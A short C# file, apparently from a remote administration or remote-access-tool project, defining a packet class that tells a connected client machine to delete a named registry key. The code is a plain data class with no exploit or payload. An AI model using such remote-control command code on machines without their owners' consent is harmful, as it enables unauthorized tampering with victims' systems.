using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoDeleteRegistryKey : IPacket
    {
        public string ParentPath { get; set; }
        public string KeyName { get; set; }

        public DoDeleteRegistryKey(string parentPath, string keyName)
        {
            ParentPath = parentPath;
            KeyName = keyName;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
